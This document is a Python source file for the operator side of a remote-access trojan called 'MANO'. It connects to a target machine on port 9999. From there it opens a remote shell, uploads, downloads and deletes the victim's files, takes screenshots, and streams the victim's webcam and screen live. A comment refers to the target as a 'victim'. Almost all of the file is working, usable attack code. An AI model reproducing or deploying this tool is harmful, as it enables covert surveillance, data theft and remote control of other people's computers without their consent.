import socket,sys,os,threading
import threading
import time,shutil,cv2,pyautogui,pickle,struct,numpy as np
#banner
print("*******************************************************")
print("""
 __  __    _    _   _  ___   __   
|  \/  |  / \  | \ | |/ _ \  \ \  
| |\/| | / _ \ |  \| | | | |  \ \ 
| |  | |/ ___ \| |\  | |_| |  / / 
|_|  |_/_/   \_\_| \_|\___/  /_/
copyright © 2019 manoharkakumani""")
print("\n******************************************************")
#socket creating
def sock():
    try:
        s = socket.socket()
        host= input('Enter Target IP :')
        port = 9999
        s.connect((host, port))
        return(host,s)
    except:
        print("Error: In binding")
        sock()
host,s=sock()

#deletemenu

def dmenu(nm):
    print("----------------------------------------------------------------------------")
    print("1. Delete file \n2. Delet Dir/Foleder \n3. Change "+nm+" Dir \n4. File list \n5. Exit \n")
    print("----------------------------------------------------------------------------")
#deloading
def dload():
    a=100;
    while int(a)>=0:
        sys.stdout.write("\r|"+"█"*int(a/2)+"|{0:.2f}".format(a)+ "%  ")
        sys.stdout.flush()
        time.sleep(0.01)
        a-=1;

#delete files or folders in client DIR
def cdel(conn):
    try:
        dmenu("client's")
        a=int(input("Your Choice: "))
        if a==1:
           fname=input("Enter file name with extention: ")
           conn.send(('fdel~'+fname).encode("utf-8"))
           dload()
        elif a==2:
           fname=input("Enter folder name: ")
           conn.send(('fdel~'+fname).encode("utf-8"))
           dload()
        elif a==3:
           cchdir(conn)
           cdel(conn)
        elif a==4:
           cflist(conn)
           cdel(conn)
        elif a==5:
            return False
        else:
            print("\nWrong Choice!")
            cdel(conn)
        return True
    except:
        print("Error")    
#delete files or folders in your DIR
def fdel():
    try:
        dmenu("your")
        a=int(input("Your Choice: "))
        if a==1:
           fname=input("Enter file name with extention: ")
           try:
                if os.path.isfile(fname):
                    os.unlink(fname)
                    dload()
           except Exception as e:
                print(e)
        elif a==2:
           fname=input("Enter folder name: ")
           try:
                if os.path.isdir(fname):
                    shutil.rmtree(fname)
                    dload()
           except Exception as e:
                print(e)
        elif a==3:
           chdir()
           fdel()
        elif a==4:
           flist()
           fdel()
        elif a==5:
            return False
        else:
            print("\nWrong Choice!")
            fdel()
        return True
    except:
        print("Error")
        
        

#Your DIR to change    
def chdir():
    try:
        print("Your current working dir :"+os.getcwd())
        x=input("Do you want to change (Y/N) ? : ").upper()
        if x=='Y':
           dire=input("Enter your DIR to change: ")
           os.chdir(dire)
           print(os.getcwd())
        else :
            return
    except:
        print("Error")
    
#client DIR to change
    
def cchdir(conn):
    try:
        conn.send(('cdir~s').encode("utf-8"))
        print("client current working dir :"+conn.recv(1024).decode("utf-8"))
        x=input("Do you want to change (Y/N) ? : ").upper()
        conn.send(str(x).encode("utf-8"))
        if x=='Y':
           dire=input("Enter your DIR to change: ")
           conn.send((dire).encode("utf-8"))
           print("client current working dir :"+conn.recv(1024).decode("utf-8"))
        else :
            return
    except:
        print("Error")

#Your Working DIR Files
    
def flist():
    print("Your Working DIR Files :\n")
    for i in os.listdir():
        print(i)
        
#Client Working DIR Files
        
def cflist(conn):
    try:
        conn.send(('flist~s').encode("utf-8"))
        print("Client Working DIR Files")
        arr=pickle.loads(conn.recv(1024))
        for i in arr:
            print(i)
    except:
        print("Error")
        
#upload file to client
        
def fup(conn):
    try:
        filename = input("\nMANO >>Filename? -> ")
        if os.path.isfile(filename):
            conn.send(str("fup~"+filename).encode("utf-8"))
            conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
            filesize=int(os.path.getsize(filename))
            userResponse = conn.recv(1024).decode("utf-8")
            if userResponse[:2] == 'OK':
                with open(filename, 'rb') as f:
                    bytesToSend = f.read(1024)
                    conn.send(bytesToSend)
                    totalSend=len(bytesToSend)
                    while int (totalSend) < int(filesize):
                        bytesToSend = f.read(1024)
                        totalSend += len(bytesToSend)
                        conn.send(bytesToSend)
                        sys.stdout.write("\r|"+"█"*int((totalSend/float(filesize))*50)+"|{0:.2f}".format((totalSend/float(filesize))*100)+ "%  ")
                        sys.stdout.flush()
                    print("\nUpload Completed!")
        else:
            print("File Does Not Exist!")
    except:
        print("Error")

#download file from client
                
def fdown(conn):
    try:
        print(os.getcwd())
        filename = input("\nMANO >>Filename? -> ")
        if filename != 'q':
            conn.send(("fdown~"+filename).encode("utf-8"))
            data = conn.recv(1024).decode("utf-8")
            if data[:6] == 'EXISTS':
                filesize = data[6:]
                msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper()
                if msg == 'Y':
                    conn.send("OK".encode("utf-8"))
                    f = open(filename, 'wb')
                    data = (conn.recv(1024))
                    totalRecv = len(data)
                    f.write(data)
                    while int(totalRecv) < int(filesize):
                        data = conn.recv(1024)
                        totalRecv += len(data)
                        f.write(data)
                        sys.stdout.write("\r|"+"█"*int((totalRecv/float(filesize))*50)+"|{0:.2f}".format((totalRecv/float(filesize))*100)+ "%  ")
                        sys.stdout.flush()
                        time.sleep(0.01)
                    print("\nDownload Complete!")
                    f.close()
            else:
                print("File Does Not Exist!")
    except:
        print("Error")
#screenshot
def sshot(conn):
    try:
        filename=str(input('Enter Screenshot name to save: '))+".jpg"
        data = conn.recv(1024).decode("utf-8")
        if data[:6] == 'EXISTS':
            filesize = data[6:]
            conn.send("OK".encode("utf-8"))
            f = open(filename, 'wb')
            data = (conn.recv(1024))
            totalRecv = len(data)
            f.write(data)
            while int(totalRecv) < int(filesize):
                data = conn.recv(1024)
                totalRecv += len(data)
                f.write(data)
        else:
            print("Fail to take screenshot!")
        return
    except:
        print("Error")

#camera
def cam(conn):
    K=conn.recv(1024).decode("utf-8")
    if K=="OK":
        C=conn.recv(1024).decode("utf-8")
        if C=="cam":
            data = b""
            img = struct.calcsize(">L")
            while True:
                if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
                    conn.send("close".encode('utf-8'))
                    cv2.destroyAllWindows()
                    break
                else:
                    conn.send("cam".encode('utf-8'))
                    while len(data) < img:
                        data += conn.recv(4096)
                    img_size = data[:img]
                    data = data[img:]
                    msg_size = struct.unpack(">L", img_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame=pickle.loads(data[:msg_size], fix_imports=True, encoding="bytes")
                    data = data[msg_size:]
                    frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
                    cv2.namedWindow('Client Camera', cv2.WINDOW_NORMAL)
                    cv2.imshow('Client Camera',frame)
        else:
            print(C)
    else:
        print(K)
#screenstreaming
def stream(conn):
    try:
        K=conn.recv(1024).decode("utf-8")
        if K=="OK":
            while True:
                if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
                    conn.send("close".encode('utf-8'))
                    cv2.destroyAllWindows()
                    break
                else:
                    data = b""
                    screen = struct.calcsize(">L")
                    conn.send("sst".encode('utf-8'))
                    while len(data) < screen:
                        data += conn.recv(4096)
                    screen_size = data[:screen]
                    data = data[screen:]
                    msg_size = struct.unpack(">L", screen_size)[0]
                    while len(data) < msg_size:
                        data += conn.recv(4096)
                    frame_data = data[:msg_size]
                    data = data[msg_size:]
                    frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                    frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                    b,g,r = cv2.split(frame)       # get b,g,r
                    rgb_img = cv2.merge([r,g,b])     # switch it to rgb
                    cv2.namedWindow('Client Screen', cv2.WINDOW_NORMAL)
                    cv2.imshow('Client Screen',rgb_img)
                    cv2.waitKey(1)
        else:
            print(K)
    except:
        print("Error")
                
#commands that perform on client
def mano(cip,conn):
    while True:
        cli= input("MANO >>"+cip+' >>')
        if cli=='shell':
            sendcommands(conn)
        elif cli=='fdown':
            fdown(conn)
        elif cli=='fup':
            fup(conn)
        elif cli=='flist':
            flist()
        elif cli=='cflist':
            cflist(conn)
        elif cli=='chdir':
            chdir()
        elif cli=='cchdir':
            cchdir(conn)
        elif cli=='cdel':
           if(cdel(conn)):
               print(conn.recv(1024).decode("utf-8"))               
        elif cli=='fdel':
             if(fdel()):
                 print("SUCCESS!")
        elif cli=='getcd':
             print("your current working dir :"+os.getcwd())
        elif cli=='getccd':
             conn.send(('cwd~s').encode("utf-8"))
             print("client current working dir :"+conn.recv(1024).decode("utf-8"))
        elif cli=='sshot':
             conn.send(('sshot~s').encode("utf-8"))
             msg=conn.recv(1024).decode("utf-8")
             if msg=='OK':
                 sshot(conn)
             else:
                 print(msg)
        elif cli=='cam':
            conn.send(('cam~s').encode("utf-8"))
            cam(conn)
        elif cli=='sst':
            conn.send(('sst~s').encode("utf-8"))
            stream(conn)
        elif cli=='back':
            return
        elif cli=='exit':
            conn.send(('exit~s').encode("utf-8"))
            return
        elif cli == 'help':
            print("""
shell --> To open cmd or terminal \n
fdown --> to download files from client\nfup --> upload files to client \n
flist --> List files in current dir \ncflist --> List files in client's current dir \n
getcd --> Get current dir\ngetccd --> Get client's current dir \n
chdir --> Change current dir\ncchdir --> Change client's current dir \n
fdel --> Delete file in current dir \ncdel --> Delete file from client's current dir \n
sshot --> Take screenshot\ncam --> To access client camera\nsst --> Screen Stream\n
help --> help \nback --> back to MANO\nexit -->to terminate : """+cip+"""\n""")
        else :
              print("Command not recognized")

# Send commands to client/victim or a friend
def sendcommands(conn):
    try:
        conn.send(("cmd~echo").encode("utf-8"))
        client_response = str(conn.recv(20480), "utf-8")
        print(client_response, end="")
        while True:
            try:
                cmd = input('')
                if cmd== 'quit':
                    return
                cmd='cmd~'+cmd
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")
            except:
                print("Error sending commands")
                break
    except:
        print("Error while connecting Shell")
mano(host,s)